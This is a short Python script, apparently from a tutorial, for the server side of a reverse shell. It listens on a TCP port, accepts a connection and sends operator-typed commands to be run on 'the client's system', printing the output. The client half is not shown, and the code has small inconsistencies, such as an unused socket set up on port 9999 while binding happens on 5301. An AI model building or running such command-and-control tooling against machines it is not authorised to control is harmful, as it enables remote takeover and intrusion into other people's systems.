import socket
import sys


host, port, my_socket = "", 5301, socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def create_socket():
    try:
        global host, port, s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind_socket():
    try:
        global host
        global port
        global my_socket
        print("Binding the Port: {}".format(port))
        my_socket.bind((host, port))
        my_socket.listen(5)
    except socket.error as msg:
        print("Socket Binding error: {}\nRetrying: ".format(msg))
        bind_socket()


def socket_accept():
    global host, port, my_socket
    conn, address = my_socket.accept()
    print("TCP CONNECTION HAS BEEN ESTABLISHED! |" + " IP: " + address[0] + " | PORT: " + str(address[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input("ENTER THE COMMAND FOR THE CLIENT'S SYSTEM: ")
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print("CLIENT'S RESPONSE: {}".format(client_response), end="")
        if cmd == 'quit':
            conn.close()
            my_socket.close()
            sys.exit()


def main():
    create_socket()
    bind_socket()
    socket_accept()


if __name__ == '__main__':
    main()
